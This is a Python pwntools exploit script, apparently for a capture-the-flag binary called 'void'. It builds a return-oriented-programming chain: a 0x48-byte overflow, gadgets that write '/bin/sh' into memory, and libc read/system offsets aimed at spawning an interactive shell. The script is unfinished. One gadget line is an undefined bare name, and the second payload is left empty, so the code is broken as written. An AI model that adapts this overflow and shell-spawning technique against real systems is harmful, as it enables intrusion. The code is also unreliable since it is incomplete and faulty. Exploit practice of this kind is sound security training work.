from pwn import *
from time import sleep

context.binary = './void'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

HOST = ''
PORT = 123

def get_process():
  proc = process()
  #proc = remote(HOST, PORT)

  return proc

def attach_gdb(proc):
  gdb.attach(proc, gdbscript="""

  """)
  sleep(1)

def main():
  proc = get_process()
  attach_gdb(proc)

  g_pop_rbp = p64(0x401109)
  g_pop_rsi_pop_r15 = p64(0x4011b9)
  g_mov_qword_rbp0x10_rsi_call_0x1122 = p64(0x40114e)
  g_adc_dword_rax_edi_test_rax_rax_je_0x10e0_mov_edi_0x404030_jmp_rax;

  binsh = p64(int.from_bytes(b'/bin/sh\x00', 'little'))

  payload = b''.join([
    b'A'*0x48,
    g_pop_rbp,
    p64(0x404040),
    g_pop_rsi_pop_r15,
    binsh,
    b'A'*8,
    g_mov_qword_rbp0x10_rsi_call_0x1122
  ])

  # load rbp value into register
  # use this gadget 40114e mov qword ptr [rbp - 0x10], rsi; call 0x1122; mov eax, 0; leave; ret; 
  # put the value where rip + offset can move it into eax using | mov eax, dword ptr [rip + 0x21ed]; test rax, rax; je 0x1012; call rax;
  # 0x40114f
  # mov dword ptr [rbp - 0x10], esi; call 0x1122; mov eax, 0; leave; ret;
  # put /bin/sh in 0x404030
  # finish off with this adc dword ptr [rax], edi; test rax, rax; je 0x10e0; mov edi, 0x404030; jmp rax;

  proc.sendline(payload)

  glibc = ELF('./glibc/libc.so.6')
  read_offset = glibc.symbols['read']
  system_offset = glibc.symbols['system']

  offset = read_offset - system_offset

  payload = b''.join([
    b'A'*0x48,
    
  ])

  proc.sendline(payload)

  proc.interactive()

if __name__ == '__main__':
  main()
